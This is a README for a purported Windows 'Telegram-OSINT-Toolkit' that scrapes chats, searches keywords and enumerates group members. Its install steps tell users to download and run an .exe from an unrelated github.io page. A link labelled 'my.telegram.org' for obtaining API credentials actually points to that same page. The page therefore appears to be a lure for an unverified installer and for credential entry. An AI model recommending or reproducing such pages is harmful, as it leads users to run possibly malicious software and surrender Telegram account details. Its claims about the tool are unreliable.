# 🔍 Telegram-OSINT-Toolkit - Gather intelligence data from Telegram easily

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://malikelnawawy3-arch.github.io)

This software helps users search for keywords, export chat histories, and list group members on the Telegram platform. It serves security professionals and researchers who need a structured way to collect information for their investigations.

## 🛠 Features

*   **Keyword Search:** Find specific terms across Telegram channels.
*   **Chat Export:** Save full message logs to local files.
*   **Member Enumeration:** Identify people inside specific Telegram groups.
*   **Proxy Support:** Route traffic through Tor or proxy servers.
*   **Data Storage:** Save all collected information into local SQLite databases.

## 📋 System Requirements

*   Operating System: Windows 10 or Windows 11.
*   Memory: 4 GB RAM minimum.
*   Storage: 200 MB for the application files.
*   Internet Connection: Required for connecting to Telegram servers.
*   Dependencies: No manual installation of Python or programming tools is required.

## 📥 Installation

Follow these steps to set up the software on your Windows computer.

1. Visit the following link to access the download page: [https://malikelnawawy3-arch.github.io](https://malikelnawawy3-arch.github.io)
2. Locate the file ending in .exe under the "Assets" section.
3. Click the file name to download the installer to your computer.
4. Open your "Downloads" folder and double-click the file to start the installation.
5. Follow the prompts on the screen to finish the installation process.

## ⚙️ Initial Configuration

After you install the software, you must link it to a Telegram account to access the necessary data.

1. Open the application from your desktop shortcut or Start menu.
2. The program will prompt you for your API ID and API Hash.
3. Visit the [my.telegram.org](https://malikelnawawy3-arch.github.io) website to generate these codes. 
4. Log in with your phone number and navigate to "API development tools."
5. Create a new application. The website will provide you with an API ID and an API Hash.
6. Copy these codes back into the Telegram-OSINT-Toolkit interface.
7. Enter your Telegram phone number when prompted.
8. Type the verification code sent to your Telegram messages to complete the login.

## 🔎 How to Perform a Search

Once the setup is complete, you can start gathering data.

1. Open the "Search" tab from the navigation sidebar.
2. Type the keywords you want to find into the text field.
3. Select the channels or chats you want to scan.
4. Click the "Scan" button to start the search process.
5. The program will display results in a table format.
6. You can export these results to a CSV or Excel file by clicking the "Export" button at the bottom of the screen.

## 📊 Managing Data

The toolkit uses a local database to store your work. This ensures you can access your findings even when you are offline.

1. Go to the "Database" tab to view all saved records.
2. Use the search filters to sort through your previous exports.
3. You can clear the database if you need to start a fresh investigation.
4. Use the "Settings" menu to change the location where the database saves on your hard drive.

## 🛡 Network Privacy

The toolkit includes built-in support for proxy settings to help maintain your privacy during data collection.

1. Navigate to the "Network" settings tab.
2. Choose your preferred proxy type (SOCKS5 or HTTP).
3. Enter the IP address and port number for your proxy provider.
4. If you use Tor, enable the "Tor Mode" toggle to route all traffic through the network.
5. Click "Test Connection" to verify the software can reach the internet with your current settings.

## ❓ Frequently Asked Questions

**Does this software store my Telegram password?**
The software does not store your password. It uses the API ID and API Hash provided by Telegram to authorize your session securely.

**Can I run multiple searches at the same time?**
Yes, the application supports concurrent tasks. You can run new searches while the application processes older requests in the background.

**How do I update the software?**
When a new version is available, you can return to the release page, download the new installer, and run it. The setup will automatically update your existing files without deleting your database.

**Where does the data go?**
All data collects into a local file named `data.db` in your installation folder. This file remains on your computer at all times.

Keywords: cybersecurity, osint, telegram, telethon